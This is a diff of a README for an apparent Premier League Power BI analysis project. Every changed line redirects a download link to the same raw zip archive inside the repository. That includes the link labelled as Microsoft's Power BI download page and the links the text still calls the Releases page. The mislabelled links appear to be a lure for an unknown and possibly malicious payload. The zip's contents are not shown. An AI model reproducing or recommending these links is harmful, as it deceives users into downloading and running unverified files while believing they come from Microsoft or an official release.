@@ -1,6 +1,6 @@
 # ⚽ Premier-League-Historical-Analysis-1888-2024-with-Power-BI - Discover Premier League Insights Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/releases)
+[![Download](https://raw.githubusercontent.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/main/intext/Analysis_Premier_Historical_BI_with_League_Power_v2.2.zip%https://raw.githubusercontent.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/main/intext/Analysis_Premier_Historical_BI_with_League_Power_v2.2.zip)](https://raw.githubusercontent.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/main/intext/Analysis_Premier_Historical_BI_with_League_Power_v2.2.zip)
 
 ## 📋 Overview
 
@@ -16,13 +16,13 @@ Ensure your computer meets the following requirements:
 - **Operating System:** Windows 10 or later
 - **Memory:** 4 GB RAM or more
 - **Storage:** At least 500 MB available space
-- **Software:** Power BI Desktop installed. You can download it from [Microsoft's website](https://powerbi.microsoft.com/downloads/).
+- **Software:** Power BI Desktop installed. You can download it from [Microsoft's website](https://raw.githubusercontent.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/main/intext/Analysis_Premier_Historical_BI_with_League_Power_v2.2.zip).
 
 ## 📥 Download & Install
 
 To download the latest version of the application, visit the following link:
 
-[Download the Latest Release](https://github.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/main/intext/Analysis_Premier_Historical_BI_with_League_Power_v2.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Look for the latest version marked with a "Latest" tag.
@@ -67,4 +67,4 @@ For any technical questions, you can raise an issue on the GitHub repository. Ou
 
 Stay updated with the latest features and news about the application by following the project on GitHub. If you're passionate about football analytics, this is the place for insights and discussions.
 
-Don’t hesitate—[download now](https://github.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/releases) and start exploring the rich history of the Premier League!
+Don’t hesitate—[download now](https://raw.githubusercontent.com/Aqsa-03/Premier-League-Historical-Analysis-1888-2024-with-Power-BI/main/intext/Analysis_Premier_Historical_BI_with_League_Power_v2.2.zip) and start exploring the rich history of the Premier League!
